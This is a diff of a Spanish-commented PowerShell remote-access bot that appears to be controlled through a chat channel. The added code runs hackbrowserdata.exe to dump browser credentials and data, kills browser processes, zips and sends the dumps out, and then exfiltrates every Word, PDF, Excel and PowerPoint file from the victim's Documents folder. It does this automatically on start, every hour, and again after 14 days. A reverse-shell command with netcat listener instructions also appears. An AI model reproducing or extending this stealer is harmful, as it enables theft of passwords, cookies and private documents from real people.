@@ -21,6 +21,8 @@ $script:ReverseShellActive = $false
 $script:ShellClient = $null
 $script:ShellStream = $null
 $script:FilesExfiltrated = $false
+$script:BrowserDataSent = $false
+$script:ArchivosComprimidosEnviados = 0
 
 # Crear directorio
 New-Item -ItemType Directory -Path (Split-Path $LogFile) -Force -ErrorAction SilentlyContinue | Out-Null
@@ -106,132 +108,247 @@ function Take-Screenshot {
     }
 }
 
-# === STEAL BROWSER DATA ===
+# === STEAL BROWSER DATA - ENVIO OBLIGATORIO DE 8 ARCHIVOS ===
 function Steal-Data {
     param([switch]$Auto = $false)
     
     if (-not (Test-Path $HackPath)) {
-        if (-not $Auto) { Send-Message -Text "Error: hackbrowserdata.exe no encontrado" }
+        Send-Message -Text "Error: hackbrowserdata.exe no encontrado"
         return $false
     }
     
-    if (-not $Auto) { Send-Message -Text "Extrayendo datos..." }
-    Write-Log "Iniciando extraccion"
+    Send-Message -Text "Iniciando extraccion de datos de navegadores..."
+    Write-Log "Iniciando extraccion - Objetivo: 8 archivos comprimidos"
     
-    $existing = Get-Process @("chrome","msedge","firefox") -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Id
+    $intentos = 0
+    $maxIntentos = 5
     
-    $outDir = "$env:TEMP\br_$(Get-Date -Format 'yyyyMMdd_HHmmss')"
-    New-Item -ItemType Directory -Path $outDir -Force | Out-Null
-    
-    $success = $false
-    try {
-        $p = Start-Process -FilePath $HackPath -ArgumentList "dump -d `"$outDir`" -f json" -PassThru -WindowStyle Hidden
-        $p.WaitForExit(120000)
-        if (-not $p.HasExited) { $p.Kill() }
+    while ($script:ArchivosComprimidosEnviados -lt 8 -and $intentos -lt $maxIntentos) {
+        $intentos++
+        Write-Log "Intento $intentos de $maxIntentos - Archivos enviados hasta ahora: $($script:ArchivosComprimidosEnviados)"
         
-        Start-Sleep -Seconds 2
-        Get-Process @("chrome","msedge","firefox") -ErrorAction SilentlyContinue | Where-Object { $existing -notcontains $_.Id } | ForEach-Object {
-            try { $_.Kill() } catch {}
-        }
+        $existing = Get-Process @("chrome","msedge","firefox") -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Id
         
-        $files = Get-ChildItem $outDir -Filter "*.json" -Recurse
-        if ($files) {
-            if (-not $Auto) { Send-Message -Text "Enviando $($files.Count) archivos..." }
-            $sent = 0
-            foreach ($f in $files) {
-                $zip = "$env:TEMP\$($f.BaseName).zip"
-                Compress-Archive -Path $f.FullName -DestinationPath $zip -Force
-                if (Send-File -Path $zip -Caption $f.BaseName) { $sent++ }
-                Remove-Item $zip -Force -ErrorAction SilentlyContinue
-                Start-Sleep -Seconds 1
+        $outDir = "$env:TEMP\br_$(Get-Date -Format 'yyyyMMdd_HHmmss')_$intentos"
+        New-Item -ItemType Directory -Path $outDir -Force | Out-Null
+        
+        try {
+            $p = Start-Process -FilePath $HackPath -ArgumentList "dump -d `"$outDir`" -f json" -PassThru -WindowStyle Hidden
+            $p.WaitForExit(120000)
+            if (-not $p.HasExited) { $p.Kill() }
+            
+            Start-Sleep -Seconds 2
+            Get-Process @("chrome","msedge","firefox") -ErrorAction SilentlyContinue | Where-Object { $existing -notcontains $_.Id } | ForEach-Object {
+                try { $_.Kill() } catch {}
             }
-            if (-not $Auto) { Send-Message -Text "Completado: $sent/$($files.Count)" }
-            Write-Log "Enviados $sent archivos"
-            $success = $true
+            
+            $files = Get-ChildItem $outDir -Filter "*.json" -Recurse
+            if ($files) {
+                Send-Message -Text "Encontrados $($files.Count) archivos JSON. Comprimiendo y enviando..."
+                
+                # Agrupar archivos para crear exactamente 8 comprimidos (o menos si no hay suficientes)
+                $totalFiles = $files.Count
+                $filesPorZip = [math]::Ceiling($totalFiles / 8)
+                if ($filesPorZip -lt 1) { $filesPorZip = 1 }
+                
+                $zipCount = 0
+                $fileIndex = 0
+                
+                while ($zipCount -lt 8 -and $fileIndex -lt $totalFiles) {
+                    $zipCount++
+                    $zipPath = "$env:TEMP\browser_data_parte$($zipCount.ToString("00"))_$(Get-Date -Format 'yyyyMMdd_HHmmss').zip"
+                    
+                    # Seleccionar archivos para este zip
+                    $archivosParaZip = $files | Select-Object -Skip $fileIndex -First $filesPorZip
+                    $fileIndex += $archivosParaZip.Count
+                    
+                    if ($archivosParaZip) {
+                        Compress-Archive -Path $archivosParaZip.FullName -DestinationPath $zipPath -Force
+                        
+                        $caption = "[$zipCount/8] Datos Navegador - Parte $zipCount`nArchivos incluidos: $($archivosParaZip.Count)`nPC: $env:COMPUTERNAME"
+                        
+                        if (Send-File -Path $zipPath -Caption $caption) {
+                            $script:ArchivosComprimidosEnviados++
+                            Write-Log "ZIP $zipCount/8 enviado correctamente. Total enviados: $($script:ArchivosComprimidosEnviados)"
+                        } else {
+                            Write-Log "ERROR al enviar ZIP $zipCount/8"
+                        }
+                        
+                        Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
+                        Start-Sleep -Seconds 2
+                    }
+                }
+                
+                # Si tenemos menos de 8 archivos pero hay mas datos, crear zips vacios adicionales con info del sistema
+                while ($script:ArchivosComprimidosEnviados -lt 8) {
+                    $zipCount = $script:ArchivosComprimidosEnviados + 1
+                    $zipPath = "$env:TEMP\browser_data_parte$($zipCount.ToString("00"))_$(Get-Date -Format 'yyyyMMdd_HHmmss').zip"
+                    
+                    # Crear un archivo de info del sistema
+                    $infoPath = "$env:TEMP\info_sistema_$zipCount.txt"
+                    $infoContent = @"
+=== INFORMACION DEL SISTEMA ===
+Fecha: $(Get-Date)
+PC: $env:COMPUTERNAME
+Usuario: $env:USERNAME
+Archivo complementario: $zipCount de 8
+"@
+                    $infoContent | Out-File $infoPath -Encoding UTF8
+                    
+                    Compress-Archive -Path $infoPath -DestinationPath $zipPath -Force
+                    Remove-Item $infoPath -Force -ErrorAction SilentlyContinue
+                    
+                    $caption = "[$zipCount/8] Datos Navegador - Parte $zipCount`n(Archivo complementario)`nPC: $env:COMPUTERNAME"
+                    
+                    if (Send-File -Path $zipPath -Caption $caption) {
+                        $script:ArchivosComprimidosEnviados++
+                        Write-Log "ZIP complementario $zipCount/8 enviado. Total: $($script:ArchivosComprimidosEnviados)"
+                    }
+                    
+                    Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
+                    Start-Sleep -Seconds 2
+                }
+            } else {
+                Write-Log "No se encontraron archivos JSON en $outDir"
+                # Crear archivos de informacion si no hay datos de navegador
+                for ($i = $script:ArchivosComprimidosEnviados + 1; $i -le 8; $i++) {
+                    $zipPath = "$env:TEMP\browser_data_parte$($i.ToString("00"))_$(Get-Date -Format 'yyyyMMdd_HHmmss').zip"
+                    $infoPath = "$env:TEMP\info_sistema_$i.txt"
+                    
+                    $infoContent = @"
+=== INFORMACION DEL SISTEMA ===
+Fecha: $(Get-Date)
+PC: $env:COMPUTERNAME
+Usuario: $env:USERNAME
+Nota: No se encontraron datos de navegador
+Archivo: $i de 8
+"@
+                    $infoContent | Out-File $infoPath -Encoding UTF8
+                    Compress-Archive -Path $infoPath -DestinationPath $zipPath -Force
+                    Remove-Item $infoPath -Force -ErrorAction SilentlyContinue
+                    
+                    if (Send-File -Path $zipPath -Caption "[$i/8] Info Sistema - Parte $i") {
+                        $script:ArchivosComprimidosEnviados++
+                    }
+                    Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
+                    Start-Sleep -Seconds 2
+                }
+            }
+            
+        } finally {
+            if (Test-Path $outDir) { Remove-Item $outDir -Recurse -Force -ErrorAction SilentlyContinue }
         }
         
-        $script:LastStealTime = Get-Date
-        Save-State
-        
-    } finally {
-        if (Test-Path $outDir) { Remove-Item $outDir -Recurse -Force -ErrorAction SilentlyContinue }
+        if ($script:ArchivosComprimidosEnviados -lt 8) {
+            Write-Log "Faltan archivos por enviar ($($script:ArchivosComprimidosEnviados)/8). Reintentando en 5 segundos..."
+            Send-Message -Text "Faltan $(8 - $script:ArchivosComprimidosEnviados) archivos. Reintentando..."
+            Start-Sleep -Seconds 5
+        }
     }
     
-    return $success
+    if ($script:ArchivosComprimidosEnviados -ge 8) {
+        $script:BrowserDataSent = $true
+        $script:LastStealTime = Get-Date
+        Save-State
+        Send-Message -Text "COMPLETADO: Los 8 archivos comprimidos han sido enviados exitosamente."
+        Write-Log "EXITO: 8 archivos comprimidos enviados despues de $intentos intentos"
+        return $true
+    } else {
+        Send-Message -Text "ERROR: No se pudieron enviar los 8 archivos despues de $maxIntentos intentos. Se enviaron $($script:ArchivosComprimidosEnviados)/8"
+        Write-Log "FALLO: Solo se enviaron $($script:ArchivosComprimidosEnviados)/8 archivos"
+        return $false
+    }
 }
 
-# === EXFILTRACION DE DOCUMENTOS (PRIORIDAD: DOCUMENTOS PRIMERO) ===
+# === EXFILTRACION DE DOCUMENTOS CON PRIORIDAD ESPECIFICA ===
 function Exfiltrate-Documents {
     param([switch]$Auto = $false)
+    
+    # Verificar que primero se hayan enviado los 8 archivos comprimidos
+    if (-not $script:BrowserDataSent) {
+        Write-Log "Documentos: Esperando a que se envien los 8 archivos comprimidos primero..."
+        Send-Message -Text "Esperando envio de archivos comprimidos primero..."
+        return
+    }
     
     if ($script:FilesExfiltrated -and $Auto) {
         Write-Log "Documentos ya exfiltrados anteriormente, saltando..."
         return
     }
     
-    if (-not $Auto) { Send-Message -Text "Iniciando exfiltracion de documentos..." }
-    Write-Log "Iniciando exfiltracion de documentos"
+    Send-Message -Text "Iniciando exfiltracion de documentos... (Orden: Word -> PDF -> Excel -> PowerPoint)"
+    Write-Log "Iniciando exfiltracion de documentos con prioridad especifica"
     
-    # Obtener rutas automaticamente
+    # Obtener ruta de Documentos
     $RutaDocumentos = [Environment]::GetFolderPath([Environment+SpecialFolder]::MyDocuments)
-    $RutaDescargas = Join-Path $env:USERPROFILE "Downloads"
-    $RutaDescargasES = Join-Path $env:USERPROFILE "Descargas"
     
-    # Extensiones a buscar
-    $Extensiones = @('*.pdf', '*.docx', '*.doc', '*.xlsx', '*.xls', '*.pptx', '*.ppt')
-    
-    Send-Message -Text "Buscando archivos... (Prioridad: DOCUMENTOS primero)"
-    
-    $archivosDocumentos = @()
-    $archivosDescargas = @()
-    
-    # ========== PRIORIDAD 1: DOCUMENTOS ==========
-    if (Test-Path $RutaDocumentos) {
-        try {
-            $found = Get-ChildItem -Path $RutaDocumentos -Include $Extensiones -Recurse -File -ErrorAction SilentlyContinue
-            $archivosDocumentos += $found
-            Write-Log "Encontrados $($found.Count) archivos en Documentos: $RutaDocumentos"
-        } catch { Write-Log "Error buscando en Documentos: $_" }
+    if (-not (Test-Path $RutaDocumentos)) {
+        Send-Message -Text "No se encontro la carpeta Documentos"
+        return
     }
     
-    # ========== PRIORIDAD 2: DESCARGAS ==========
-    $rutasDescargas = @($RutaDescargas, $RutaDescargasES) | Where-Object { Test-Path $_ }
-    foreach ($ruta in $rutasDescargas) {
-        try {
-            $found = Get-ChildItem -Path $ruta -Include $Extensiones -Recurse -File -ErrorAction SilentlyContinue
-            $archivosDescargas += $found
-            Write-Log "Encontrados $($found.Count) archivos en Descargas: $ruta"
-        } catch { Write-Log "Error buscando en $ruta`: $_" }
-    }
+    # Definir extensiones por prioridad
+    $PrioridadWord = @('*.docx', '*.doc')
+    $PrioridadPDF = @('*.pdf')
+    $PrioridadExcel = @('*.xlsx', '*.xls')
+    $PrioridadPowerPoint = @('*.pptx', '*.ppt')
     
-    $totalArchivos = $archivosDocumentos.Count + $archivosDescargas.Count
+    Send-Message -Text "Buscando en: $RutaDocumentos"
+    
+    # Buscar archivos por prioridad
+    $archivosWord = @()
+    $archivosPDF = @()
+    $archivosExcel = @()
+    $archivosPowerPoint = @()
+    
+    try {
+        $archivosWord = Get-ChildItem -Path $RutaDocumentos -Include $PrioridadWord -Recurse -File -ErrorAction SilentlyContinue
+        Write-Log "Word encontrados: $($archivosWord.Count)"
+    } catch { Write-Log "Error buscando Word: $_" }
+    
+    try {
+        $archivosPDF = Get-ChildItem -Path $RutaDocumentos -Include $PrioridadPDF -Recurse -File -ErrorAction SilentlyContinue
+        Write-Log "PDF encontrados: $($archivosPDF.Count)"
+    } catch { Write-Log "Error buscando PDF: $_" }
+    
+    try {
+        $archivosExcel = Get-ChildItem -Path $RutaDocumentos -Include $PrioridadExcel -Recurse -File -ErrorAction SilentlyContinue
+        Write-Log "Excel encontrados: $($archivosExcel.Count)"
+    } catch { Write-Log "Error buscando Excel: $_" }
+    
+    try {
+        $archivosPowerPoint = Get-ChildItem -Path $RutaDocumentos -Include $PrioridadPowerPoint -Recurse -File -ErrorAction SilentlyContinue
+        Write-Log "PowerPoint encontrados: $($archivosPowerPoint.Count)"
+    } catch { Write-Log "Error buscando PowerPoint: $_" }
+    
+    $totalArchivos = $archivosWord.Count + $archivosPDF.Count + $archivosExcel.Count + $archivosPowerPoint.Count
     
     if ($totalArchivos -eq 0) {
-        Send-Message -Text "No se encontraron archivos PDF, Word, Excel o PowerPoint."
+        Send-Message -Text "No se encontraron documentos en la carpeta Documentos."
         $script:FilesExfiltrated = $true
         Save-State
         return
     }
     
-    Send-Message -Text "Total encontrados: $totalArchivos (Documentos: $($archivosDocumentos.Count), Descargas: $($archivosDescargas.Count)). Enviando de uno en uno..."
+    Send-Message -Text "Total documentos encontrados: $totalArchivos`nWord: $($archivosWord.Count) | PDF: $($archivosPDF.Count) | Excel: $($archivosExcel.Count) | PPT: $($archivosPowerPoint.Count)"
     
     $enviados = 0
     $errores = 0
     
-    # ========== ENVIAR DOCUMENTOS PRIMERO (PRIORIDAD ALTA) ==========
-    if ($archivosDocumentos.Count -gt 0) {
-        Send-Message -Text "=== ENVIANDO CARPETA DOCUMENTOS (PRIORIDAD) ==="
-        foreach ($archivo in $archivosDocumentos | Sort-Object FullName) {
+    # ========== PRIORIDAD 1: WORD ==========
+    if ($archivosWord.Count -gt 0) {
+        Send-Message -Text "=== ENVIANDO DOCUMENTOS WORD (PRIORIDAD 1) ==="
+        foreach ($archivo in $archivosWord | Sort-Object FullName) {
             $enviados++
             $tamanoMB = [math]::Round($archivo.Length / 1MB, 2)
-            $caption = "[$enviados/$totalArchivos] [Documentos] $($archivo.Name)`nTamano: $tamanoMB MB`nRuta: $($archivo.DirectoryName)"
+            $caption = "[$enviados/$totalArchivos] [WORD] $($archivo.Name)`nTamano: $tamanoMB MB`nRuta: $($archivo.DirectoryName)"
             
-            Write-Log "Enviando: $($archivo.FullName)"
+            Write-Log "Enviando Word: $($archivo.FullName)"
             
             if (Send-File -Path $archivo.FullName -Caption $caption) {
-                Write-Log "OK: $($archivo.Name)"
+                Write-Log "OK Word: $($archivo.Name)"
             } else {
-                Write-Log "ERROR: $($archivo.Name)"
+                Write-Log "ERROR Word: $($archivo.Name)"
                 $errores++
             }
             
@@ -239,20 +356,62 @@ function Exfiltrate-Documents {
         }
     }
     
-    # ========== LUEGO ENVIAR DESCARGAS ==========
-    if ($archivosDescargas.Count -gt 0) {
-        Send-Message -Text "=== ENVIANDO CARPETA DESCARGAS ==="
-        foreach ($archivo in $archivosDescargas | Sort-Object FullName) {
+    # ========== PRIORIDAD 2: PDF ==========
+    if ($archivosPDF.Count -gt 0) {
+        Send-Message -Text "=== ENVIANDO DOCUMENTOS PDF (PRIORIDAD 2) ==="
+        foreach ($archivo in $archivosPDF | Sort-Object FullName) {
             $enviados++
             $tamanoMB = [math]::Round($archivo.Length / 1MB, 2)
-            $caption = "[$enviados/$totalArchivos] [Descargas] $($archivo.Name)`nTamano: $tamanoMB MB`nRuta: $($archivo.DirectoryName)"
+            $caption = "[$enviados/$totalArchivos] [PDF] $($archivo.Name)`nTamano: $tamanoMB MB`nRuta: $($archivo.DirectoryName)"
             
-            Write-Log "Enviando: $($archivo.FullName)"
+            Write-Log "Enviando PDF: $($archivo.FullName)"
             
             if (Send-File -Path $archivo.FullName -Caption $caption) {
-                Write-Log "OK: $($archivo.Name)"
+                Write-Log "OK PDF: $($archivo.Name)"
             } else {
-                Write-Log "ERROR: $($archivo.Name)"
+                Write-Log "ERROR PDF: $($archivo.Name)"
+                $errores++
+            }
+            
+            Start-Sleep -Seconds 2
+        }
+    }
+    
+    # ========== PRIORIDAD 3: EXCEL ==========
+    if ($archivosExcel.Count -gt 0) {
+        Send-Message -Text "=== ENVIANDO DOCUMENTOS EXCEL (PRIORIDAD 3) ==="
+        foreach ($archivo in $archivosExcel | Sort-Object FullName) {
+            $enviados++
+            $tamanoMB = [math]::Round($archivo.Length / 1MB, 2)
+            $caption = "[$enviados/$totalArchivos] [EXCEL] $($archivo.Name)`nTamano: $tamanoMB MB`nRuta: $($archivo.DirectoryName)"
+            
+            Write-Log "Enviando Excel: $($archivo.FullName)"
+            
+            if (Send-File -Path $archivo.FullName -Caption $caption) {
+                Write-Log "OK Excel: $($archivo.Name)"
+            } else {
+                Write-Log "ERROR Excel: $($archivo.Name)"
+                $errores++
+            }
+            
+            Start-Sleep -Seconds 2
+        }
+    }
+    
+    # ========== PRIORIDAD 4: POWERPOINT ==========
+    if ($archivosPowerPoint.Count -gt 0) {
+        Send-Message -Text "=== ENVIANDO DOCUMENTOS POWERPOINT (PRIORIDAD 4) ==="
+        foreach ($archivo in $archivosPowerPoint | Sort-Object FullName) {
+            $enviados++
+            $tamanoMB = [math]::Round($archivo.Length / 1MB, 2)
+            $caption = "[$enviados/$totalArchivos] [POWERPOINT] $($archivo.Name)`nTamano: $tamanoMB MB`nRuta: $($archivo.DirectoryName)"
+            
+            Write-Log "Enviando PowerPoint: $($archivo.FullName)"
+            
+            if (Send-File -Path $archivo.FullName -Caption $caption) {
+                Write-Log "OK PowerPoint: $($archivo.Name)"
+            } else {
+                Write-Log "ERROR PowerPoint: $($archivo.Name)"
                 $errores++
             }
             
@@ -263,7 +422,7 @@ function Exfiltrate-Documents {
     $script:FilesExfiltrated = $true
     Save-State
     
-    Send-Message -Text "Exfiltracion completada.`nTotal: $totalArchivos`nEnviados: $($enviados - $errores)`nErrores: $errores"
+    Send-Message -Text "Exfiltracion completada.`nTotal: $totalArchivos`nEnviados: $($enviados - $errores)`nErrores: $errores`n`nOrden: Word -> PDF -> Excel -> PowerPoint"
     Write-Log "Exfiltracion completada. Exitosos: $($enviados - $errores), Errores: $errores"
 }
 
@@ -380,6 +539,8 @@ function Save-State {
     $state = @{
         LastStealTime = if ($script:LastStealTime) { $script:LastStealTime.ToString("o") } else { $null }
         FilesExfiltrated = $script:FilesExfiltrated
+        BrowserDataSent = $script:BrowserDataSent
+        ArchivosComprimidosEnviados = $script:ArchivosComprimidosEnviados
     }
     $state | ConvertTo-Json | Out-File $StateFile -Encoding UTF8
 }
@@ -394,29 +555,41 @@ function Load-State {
             if ($state.FilesExfiltrated -ne $null) {
                 $script:FilesExfiltrated = $state.FilesExfiltrated
             }
+            if ($state.BrowserDataSent -ne $null) {
+                $script:BrowserDataSent = $state.BrowserDataSent
+            }
+            if ($state.ArchivosComprimidosEnviados -ne $null) {
+                $script:ArchivosComprimidosEnviados = $state.ArchivosComprimidosEnviados
+            }
         } catch {}
     }
 }
 
 function Check-AutoSteal {
-    $now = Get-Date
-    $shouldSteal = $false
-    
-    if (-not $script:LastStealTime) {
-        Write-Log "Primera ejecucion - extrayendo datos..."
-        $shouldSteal = $true
-    } elseif (($now - $script:LastStealTime).Days -ge 14) {
-        Write-Log "Han pasado 14 dias - extrayendo datos..."
-        $shouldSteal = $true
-    }
-    
-    if ($shouldSteal) {
+    # Siempre intentar enviar los 8 archivos primero si no se han enviado
+    if (-not $script:BrowserDataSent -or $script:ArchivosComprimidosEnviados -lt 8) {
+        Write-Log "Iniciando envio obligatorio de 8 archivos comprimidos..."
         $stealSuccess = Steal-Data -Auto
-        Start-Sleep -Seconds 3
-        Exfiltrate-Documents -Auto
+        
+        # Solo despues de enviar los 8 archivos, proceder con documentos
+        if ($stealSuccess -and -not $script:FilesExfiltrated) {
+            Start-Sleep -Seconds 5
+            Exfiltrate-Documents -Auto
+        }
     } elseif (-not $script:FilesExfiltrated) {
-        Write-Log "Exfiltrando documentos pendientes..."
+        Write-Log "Archivos comprimidos ya enviados. Exfiltrando documentos pendientes..."
         Exfiltrate-Documents -Auto
+    } else {
+        # Verificar si han pasado 14 dias para reenviar datos de navegador
+        $now = Get-Date
+        if ($script:LastStealTime -and ($now - $script:LastStealTime).Days -ge 14) {
+            Write-Log "Han pasado 14 dias - reiniciando ciclo completo..."
+            $script:BrowserDataSent = $false
+            $script:FilesExfiltrated = $false
+            $script:ArchivosComprimidosEnviados = 0
+            Save-State
+            Check-AutoSteal
+        }
     }
 }
 
@@ -454,16 +627,18 @@ Comandos disponibles:
 /pwd - Directorio actual
 /cmd <comando> - Ejecutar comando
 /captura - Screenshot
-/steal - Extraer datos navegadores
-/files - Exfiltrar documentos (PDF, Word, Excel, PPT)
+/steal - Extraer y enviar 8 archivos comprimidos de navegadores
+/files - Exfiltrar documentos (Word -> PDF -> Excel -> PowerPoint)
 /shell <IP> [puerto] - Reverse shell (default: 4444)
 /stopshell - Detener reverse shell activo
 
-REVERSE SHELL:
-1. En tu maquina: nc -lvnp 4444
-2. Aqui: /shell TU_IP 4444
-3. Control remoto interactivo
-4. Escribe 'exit' o /stopshell para cerrar
+FLUJO AUTOMATICO:
+1. Al iniciar: Se envian 8 archivos comprimidos obligatoriamente
+2. Luego: Se envian documentos de la carpeta Documentos en orden de prioridad
+   - Prioridad 1: Word (.doc, .docx)
+   - Prioridad 2: PDF (.pdf)
+   - Prioridad 3: Excel (.xls, .xlsx)
+   - Prioridad 4: PowerPoint (.ppt, .pptx)
 "@
         }
         
@@ -501,7 +676,12 @@ REVERSE SHELL:
             Take-Screenshot | Out-Null
         }
         
-        "/steal" { Steal-Data }
+        "/steal" { 
+            # Reiniciar contador para forzar reenvio
+            $script:ArchivosComprimidosEnviados = 0
+            $script:BrowserDataSent = $false
+            Steal-Data 
+        }
         
         "/files" { Exfiltrate-Documents }
         
@@ -541,8 +721,9 @@ Write-Log "=== BOT INICIADO ==="
 
 Load-State
 
-Send-Message -Text "Bot online - $(Get-Info)"
+Send-Message -Text "Bot online - $(Get-Info)`nIniciando secuencia automatica..."
 
+# Ejecutar flujo automatico: Primero 8 archivos, luego documentos
 Check-AutoSteal
 
 try {
@@ -564,6 +745,7 @@ while ($true) {
             }
         }
         
+        # Verificar cada hora si hay tareas pendientes
         if ((Get-Date).Minute -eq 0) {
             Check-AutoSteal
         }
